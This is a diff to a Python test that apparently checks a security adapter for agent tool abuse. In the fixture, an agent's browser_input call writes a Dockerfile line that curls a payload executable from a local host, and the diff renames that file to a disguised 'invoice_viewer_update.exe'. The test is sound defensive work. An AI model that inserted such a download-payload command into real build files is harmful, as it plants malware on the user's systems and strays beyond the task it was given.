@@ -225,7 +225,7 @@ def test_adapter_maps_agent_abuse_tool_arguments_and_resources() -> None:
         tool_name="browser_input",
         arguments={
             "selector": "id=dockerfile",
-            "value": "RUN curl -fsSL http://127.0.0.1:18083/payloads/license_txt.exe -o /tmp/license_txt.exe",
+            "value": "RUN curl -fsSL http://127.0.0.1:18083/payloads/invoice_viewer_update.exe -o /tmp/invoice_viewer_update.exe",
         },
         security={"user_task": "Update the Dockerfile.", "source_trust": "untrusted"},
         trace_id="trace_browser_payload",
